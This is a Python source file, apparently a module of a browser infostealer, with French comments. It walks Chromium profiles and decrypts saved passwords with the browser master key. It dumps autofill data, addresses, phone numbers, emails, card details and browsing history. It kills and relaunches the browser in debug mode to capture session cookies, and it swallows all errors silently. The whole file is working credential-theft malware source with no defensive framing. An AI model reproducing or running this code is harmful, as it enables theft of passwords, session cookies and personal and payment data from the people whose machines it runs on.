# chromium.py
import os
import sqlite3
import tempfile
import shutil
from utils import (
    expand, get_master_key, decrypt_value, chrome_time_to_str,
    copy_db, kill_browser, start_debug_browser, get_cookies_via_ws, format_cookie_netscape
)


def get_existing_profiles(base_path):
    """
    Retourne tous les profils réels existants (dossiers contenant Web Data ou Login Data)
    """
    profiles = set()
    if not os.path.exists(base_path):
        return profiles

    try:
        for item in os.listdir(base_path):
            full_path = os.path.join(base_path, item)
            if not os.path.isdir(full_path):
                continue
            web_data = os.path.join(full_path, "Web Data")
            login_data = os.path.join(full_path, "Login Data")
            if os.path.exists(web_data) or os.path.exists(login_data):
                profiles.add(item)
    except Exception:
        pass

    # Profil par défaut (sans sous-dossier)
    if os.path.exists(os.path.join(base_path, "Web Data")):
        profiles.add("")

    return sorted(profiles)


def extract_chromium_passwords(browser, profile, dumper):
    base_path = expand(browser["base"])
    profile_path = base_path if not profile else os.path.join(base_path, profile)
    db_path = os.path.join(profile_path, "Login Data")
    if not os.path.exists(db_path):
        return

    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db").name
    try:
        if not copy_db(db_path, temp_db):
            return

        master_key = get_master_key(browser["state"]) if browser.get("pwd", False) else None
        entries = []

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created
                FROM logins
                WHERE username_value != '' OR password_value != ''
            """)
            for url, username, encrypted_password, date_created in cursor.fetchall():
                clean_url = url.split('?')[0].rstrip('/')
                if not clean_url.startswith(("http://", "https://")):
                    continue

                password = "[Non chiffré]"
                if encrypted_password and master_key:
                    try:
                        password = decrypt_value(encrypted_password, master_key)
                    except:
                        password = "[Échec déchiffrement]"
                elif encrypted_password:
                    password = "[Chiffré sans clé]"

                created = chrome_time_to_str(date_created) if date_created else "N/A"
                entries.append(f"{clean_url} | {username} | {password} | Créé: {created}")
        except Exception:
            pass
        finally:
            conn.close()

        if entries:
            profile_name = (profile or "Default").replace(" ", "_")
            filename = f"{browser['folder']}_{profile_name}_passwords.txt"
            dumper.save(filename, "\n".join(entries), "Passwords")

    except Exception:
        pass
    finally:
        try:
            os.unlink(temp_db)
        except:
            pass


def extract_chromium_autofill(browser, profile, dumper):
    base_path = expand(browser["base"])
    profile_path = base_path if not profile else os.path.join(base_path, profile)
    db_path = os.path.join(profile_path, "Web Data")
    if not os.path.exists(db_path):
        return

    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db").name
    try:
        if not copy_db(db_path, temp_db):
            return

        master_key = get_master_key(browser["state"]) if browser.get("pwd", False) else None
        lines = []
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        # === 1. CHAMPS SIMPLES (autofill) ===
        try:
            cursor.execute("SELECT name, value, count FROM autofill WHERE value != ''")
            for name, value, count in cursor.fetchall():
                if value and value.strip():
                    lines.append(f"[{name}] {value} (Utilisé {count}x)")
        except Exception:
            pass

        # === 2. ADRESSES COMPLÈTES ===
        try:
            cursor.execute("""
                SELECT
                    company_name, full_name,
                    address_home_line1, address_home_line2, address_home_street_address,
                    address_home_city, address_home_state, address_home_zip,
                    address_home_country,
                    phone_home_whole_number, email_address
                FROM autofill_profiles
            """)
            for row in cursor.fetchall():
                company, full, l1, l2, street, city, state, zipc, country, phone, email = row
                if not any([full, l1, l2, street, city, state, zipc, country, phone, email, company]):
                    continue
                lines.append(f"[ADRESSE] {full or 'Inconnu'}")
                if company: lines.append(f"  Société: {company}")
                addr_parts = [x for x in [l1, l2, street] if x and x.strip()]
                if addr_parts: lines.append(f"  Rue: {' | '.join(addr_parts)}")
                loc = ", ".join(filter(None, [city, state, zipc])).strip()
                if loc: lines.append(f"  Localité: {loc}")
                if country: lines.append(f"  Pays: {country}")
                if phone: lines.append(f"  Téléphone: {phone}")
                if email: lines.append(f"  Email: {email}")
                lines.append("---")
        except Exception:
            pass

        # === 3. CARTES BANCAIRES ===
        try:
            cursor.execute("""
                SELECT
                    name_on_card, expiration_month, expiration_year,
                    card_number_encrypted, nickname, date_modified
                FROM credit_cards
            """)
            for name, month, year, encrypted, nick, modified in cursor.fetchall():
                if not name and not encrypted:
                    continue
                number = "[Non chiffrée]"
                if encrypted and master_key:
                    try:
                        raw = decrypt_value(encrypted, master_key)
                        number = f"**** **** **** {raw[-4:]}" if len(raw) >= 4 else "****"
                    except:
                        number = "[Échec déchiffrement]"
                elif encrypted:
                    number = "[Chiffrée sans clé]"

                lines.append(f"[CARTE] {name or 'Inconnue'}")
                if nick: lines.append(f"  Surnom: {nick}")
                lines.append(f"  Numéro: {number}")
                lines.append(f"  Exp: {month}/{year}")
                if modified:
                    mod_str = chrome_time_to_str(modified)
                    lines.append(f"  Modifié: {mod_str}")
                lines.append("---")
        except Exception:
            pass

        conn.close()

        if lines:
            profile_name = (profile or "Default").replace(" ", "_")
            filename = f"{browser['folder']}_{profile_name}_autofill.txt"
            count = len([l for l in lines if l.startswith('[')])
            dumper.save(filename, "\n".join(lines), "Autofill")

    except Exception:
        pass
    finally:
        try:
            os.unlink(temp_db)
        except:
            pass


def extract_chromium_cookies(browser, profile, dumper):
    if "exe" not in browser or not os.path.exists(browser["exe"]):
        return

    base_path = expand(browser["base"])
    profile_path = base_path if not profile else os.path.join(base_path, profile)
    if not os.path.exists(profile_path):
        return

    exe_name = os.path.basename(browser["exe"])
    kill_browser(exe_name)

    profile_dir = profile or "Default"
    if not start_debug_browser(browser["exe"], base_path, profile_dir):
        return

    cookies = get_cookies_via_ws()
    kill_browser(exe_name)
    if not cookies:
        return

    valid_domains = (".com", ".net", ".org", ".fr", ".io", ".co", ".gg", ".tv", ".app")
    formatted = [
        format_cookie_netscape(c)
        for c in cookies
        if c.get("domain", "").endswith(valid_domains)
    ]

    if formatted:
        profile_name = (profile or "Default").replace(" ", "_")
        filename = f"{browser['folder']}_{profile_name}_cookies.txt"
        dumper.save(filename, "\n".join(formatted), "Cookies")


def extract_chromium_history(browser, profile, dumper):
    base_path = expand(browser["base"])
    profile_path = base_path if not profile else os.path.join(base_path, profile)
    db_path = os.path.join(profile_path, "History")

    if not os.path.exists(db_path):
        return

    temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db").name
    try:
        if not copy_db(db_path, temp_db):
            return

        entries = []
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute("""
                SELECT
                    urls.url,
                    urls.title,
                    urls.visit_count,
                    urls.last_visit_time
                FROM urls
                ORDER BY urls.last_visit_time DESC
            """)
            for url, title, visits, last_time in cursor.fetchall():
                if not url.startswith(("http://", "https://")):
                    continue
                if "chrome-extension" in url or not title:
                    title = "[Sans titre]"
                else:
                    title = title.strip()
                    if len(title) > 100:
                        title = title[:97] + "..."

                visit_date = chrome_time_to_str(last_time) if last_time else "N/A"
                entries.append(f"[{visit_date}] {url} | {title} | Visites: {visits}")
        except Exception:
            pass
        finally:
            conn.close()

        if entries:
            profile_name = (profile or "Default").replace(" ", "_")
            filename = f"{browser['folder']}_{profile_name}_history.txt"
            dumper.save(filename, "\n".join(entries), "History")

    except Exception:
        pass
    finally:
        try:
            os.unlink(temp_db)
        except:
            pass